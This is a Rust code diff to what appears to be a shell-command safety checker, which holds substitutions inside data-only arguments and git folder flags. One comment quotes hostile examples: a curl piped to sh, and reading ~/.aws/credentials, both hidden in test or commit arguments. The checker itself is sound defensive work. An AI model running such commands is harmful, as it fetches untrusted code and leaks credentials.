@@ -930,13 +930,25 @@ fn command_unread(
         }
         CodeInput::None => {}
     }
+    // Only a plain expansion (`$T`, `"${T}"`, `${T:-x}`) can be data. A command
+    // substitution, a backtick or a process substitution in a place a known
+    // program takes as data runs before the program does, and is held unless
+    // it only prints text the line writes out (`cargo test "$(curl x | sh)"`,
+    // `pytest -k "\`id\`"`, `git commit -m "$(<~/.aws/credentials)"`).
+    let data = data_arguments(&name, arguments);
+    if nodes[offset + 1..]
+        .iter()
+        .zip(&data)
+        .any(|(node, data)| *data && runs_something(*node, source, names))
+    {
+        return Some(UNREAD_ARGUMENT);
+    }
     if !argument_flags.iter().any(|flag| *flag) {
         return None;
     }
     // Words a known program only takes as data (a test filter, a commit's
     // message, a name it gives a thing): unread there, they name no program
     // to run and no path to write or delete.
-    let data = data_arguments(&name, arguments);
     if argument_flags
         .iter()
         .zip(&data)
@@ -967,6 +979,27 @@ fn command_unread(
         _ if only_reads(&name, arguments, argument_flags) => None,
         _ => Some(UNREAD_ARGUMENT),
     }
+}
+
+/// The word holds a process substitution, or a command substitution (a
+/// backtick too) that does more than print text the line writes out
+/// (`$(cat <<'EOF' ...)`, `$(echo text)`): something runs to make it.
+fn runs_something(node: tree_sitter::Node<'_>, source: &[u8], names: &Names) -> bool {
+    let mut found = Vec::new();
+    collect_nodes_of_kind(node, "command_substitution", &mut found, 0);
+    holds_process_substitution(node)
+        || found.into_iter().any(|substitution| {
+            let mut commands = Vec::new();
+            collect_all_commands(substitution, &mut commands, 0);
+            let prints_text = commands.len() == 1
+                && command_words(commands[0], source).is_some_and(|words| {
+                    matches!(
+                        normalized_command_name(&words[0]).as_str(),
+                        "echo" | "printf" | "cat"
+                    )
+                });
+            !(prints_text && substitution_is_read(substitution, source, names, true))
+        })
 }
 
 /// The word holds a process substitution: run as code, what flows through
@@ -1273,7 +1306,14 @@ fn git_only_reads(words: &[String], flags: &[bool]) -> bool {
         match word.as_str() {
             // A setting given on the line may name a program to run.
             "-c" | "--config-env" => return false,
-            "-C" | "--git-dir" | "--work-tree" | "--namespace" => index += 2,
+            // A folder the line does not show decides which repository and
+            // which settings (hooks, a pager) git uses.
+            "-C" | "--git-dir" | "--work-tree" | "--namespace" => {
+                if flags.get(index + 1).copied().unwrap_or(true) {
+                    return false;
+                }
+                index += 2;
+            }
             _ if word.starts_with('-') => index += 1,
             _ => break,
         }
